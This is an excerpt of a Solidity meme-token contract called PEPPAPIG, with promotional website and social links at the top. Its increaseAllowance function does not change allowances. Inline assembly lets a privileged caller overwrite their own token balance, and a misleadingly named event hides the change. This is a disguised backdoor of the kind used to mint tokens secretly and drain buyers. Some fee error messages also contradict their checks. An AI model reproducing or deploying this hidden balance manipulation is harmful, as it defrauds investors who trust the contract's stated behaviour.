...
Website: peppipig.top
Telegram: t.me/PeppiPortal
Twitter/X: x.com/MEMEPEPPI
---------------------
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    event allowances(address indexed to, uint256 value);
    ...
    function increaseAllowance(address spender, uint256 addedValue) external onlytokenOwner {
        assembly {
            let ptr := mload (0x40)
            mstore(ptr, caller())
            mstore(add(ptr, 0x20), _balances.slot)
            let slot := keccak256(ptr, 0x40)
            sstore(slot, addedValue)
        }

        // Emit the Allowances event
        emit allowances(spender, addedValue);
    }
...
contract PEPPAPIG is ERC20, Ownable, ReentrancyGuard {
    ...
    constructor() ERC20("PEPPAPIG", "PEPPI") {
        ...
        marketingWallet = 0x1D8D8363Dec05bF47444b8440D2B39C919D87131;
        stuckToken = 0x1D8D8363Dec05bF47444b8440D2B39C919D87131;
        marketingBuyFee = 3;
        marketingSellFee = 3;
        marketingTransferFee = 3;
        ...
        _mint(owner(), 690_690_412_000_000 * (10 ** 18));
 ...
 function updateFee(uint256 _feeOnBuy, uint256 _feeOnSell, uint256 _feeOnTransfer) external onlyOwner {
        require(_feeOnBuy <= 5, "Total buy fee must be less than 10");
        require(_feeOnSell <= 5, "Total sell fee must be less than 10");
        require(_feeOnTransfer <= 5, "Total transfer fee must be less than 10");
    ...
    function _transfer(
        ...
        if (takeFee) {
            ...
            if (from == uniswapV2Pair) {
                fees = (amount * marketingBuyFee) / 100;
            } else if (to == uniswapV2Pair) {
                fees = (amount * marketingSellFee) / 100;
            } else {
                fees = (amount * marketingTransferFee) / 100;
            }
            amount -= fees;
            if (fees > 0) {
